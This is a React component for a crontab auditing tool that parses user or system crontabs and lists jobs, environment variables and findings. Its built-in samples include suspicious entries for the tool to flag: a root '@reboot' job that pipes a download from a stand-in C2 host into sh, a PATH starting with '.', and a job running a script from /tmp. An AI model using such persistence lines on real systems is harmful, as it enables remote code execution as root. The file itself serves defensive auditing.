import { useMemo, useState } from "react";
import { Textarea } from "@/components/ui/textarea";
import { Segmented } from "@/components/ui/segmented";
import { Field, ErrorNote } from "@/components/tool/parts";
import { FindingsSection } from "@/components/tool/findings";
import { parseCrontab } from "./logic";

type Kind = "user" | "system";

const SAMPLES: Record<Kind, string> = {
  user: `PATH=/usr/local/bin:/usr/bin:/bin
*/5 * * * * /usr/local/bin/backup.sh
0 2 * * 1 /home/alice/cleanup.sh
@reboot /tmp/agent.sh
30 4 1 * * tar -czf /backup/site.tgz /var/www`,
  system: `PATH=.:/usr/bin:/bin
*/10 * * * * root /opt/scripts/collect.sh
0 3 * * * root /home/deploy/nightly.sh
@reboot root curl http://c2.example/x | sh`,
};

export default function CrontabTool() {
  const [kind, setKind] = useState<Kind>("user");
  const [input, setInput] = useState("");
  const r = useMemo(() => parseCrontab(input, kind === "system"), [input, kind]);
  const hasInput = input.trim() !== "";

  return (
    <>
      <div className="flex flex-wrap items-center justify-between gap-3">
        <Segmented<Kind>
          aria-label="Crontab type"
          value={kind}
          onChange={setKind}
          options={[
            { value: "user", label: "User crontab" },
            { value: "system", label: "System (/etc/crontab)" },
          ]}
        />
        <button
          onClick={() => setInput(SAMPLES[kind])}
          className="text-xs text-muted-foreground transition-colors hover:text-foreground"
        >
          Load sample
        </button>
      </div>

      <Field
        label={kind === "system" ? "System crontab (with user column)" : "User crontab"}
        hint="System crontabs (/etc/crontab, /etc/cron.d/*) have a user field before the command."
      >
        <Textarea
          autoFocus
          mono
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder={"*/5 * * * * /path/to/job"}
          rows={7}
        />
      </Field>

      {hasInput && r.error ? <ErrorNote>{r.error}</ErrorNote> : null}

      {!r.error && (r.jobs.length > 0 || r.env.length > 0) ? (
        <div className="flex flex-col gap-4">
          <FindingsSection findings={r.findings} />

          {r.jobs.length > 0 ? (
            <section className="flex flex-col gap-2">
              <h3 className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                Jobs ({r.jobs.length})
              </h3>
              <div className="flex flex-col gap-2">
                {r.jobs.map((j, i) => (
                  <div key={i} className="rounded-lg border border-border bg-card/40 p-3">
                    <div className="flex flex-wrap items-baseline gap-2">
                      <code className="rounded bg-muted px-1.5 py-0.5 text-xs text-foreground">
                        {j.schedule}
                      </code>
                      {j.user ? (
                        <span className="text-xs text-muted-foreground">as {j.user}</span>
                      ) : null}
                    </div>
                    <p
                      className={
                        j.valid
                          ? "mt-1.5 text-sm text-foreground"
                          : "mt-1.5 text-sm text-destructive"
                      }
                    >
                      {j.description}
                    </p>
                    {j.command ? (
                      <p className="mt-1 break-all font-mono text-xs text-muted-foreground">
                        {j.command}
                      </p>
                    ) : null}
                  </div>
                ))}
              </div>
            </section>
          ) : null}

          {r.env.length > 0 ? (
            <section className="flex flex-col gap-2">
              <h3 className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">
                Environment
              </h3>
              <div className="flex flex-col gap-1 font-mono text-xs text-muted-foreground">
                {r.env.map((e, i) => (
                  <div key={i}>
                    <span className="text-foreground">{e.name}</span>={e.value}
                  </div>
                ))}
              </div>
            </section>
          ) : null}
        </div>
      ) : null}
    </>
  );
}
